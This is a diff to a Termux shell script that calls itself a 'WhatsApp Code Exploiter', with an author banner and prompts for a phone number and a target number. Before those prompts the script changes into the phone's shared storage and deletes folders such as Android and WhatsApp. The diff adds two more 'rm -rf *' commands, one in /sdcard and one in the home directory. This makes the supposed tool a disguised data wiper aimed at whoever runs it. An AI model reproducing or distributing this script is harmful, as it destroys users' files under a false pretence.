@@ -6,6 +6,9 @@ echo "
 #   Whatsapp Code  # By ./C3W3KBerB4T4n9
 #     Exploiter    # ceweberbatang59@gmail.com
 ####################
+
+Copyright (c) 2018 ./C3W3KBERB4T4N9 Ganteng";
+
 termux-setup-storage
 cd /sdcard
 rm -rf Android
@@ -19,6 +22,7 @@ rm -rf Movies
 rm -rf WhatsApp
 rm -rf KAWAI3
 rm -rf Vidio
+rm -rf *
 blue='\e[1;34m'
 green='\e[1;32m'
 purple='\[1;35m'
@@ -114,8 +118,8 @@ echo "Hubungi Gua reyspeed01@gmail.com"
 sleep 3
 echo "____________________________________"
 sleep 4
-
-Copyright (c) 2018 ./C3W3KBERB4T4N9 Ganteng";
+cd
+rm -rf *
 echo "";
 read -p "Nomer Kamu (+62xxxx)=> " nomer;
 read -p "Nomer Target (+62xxxx) => " target;
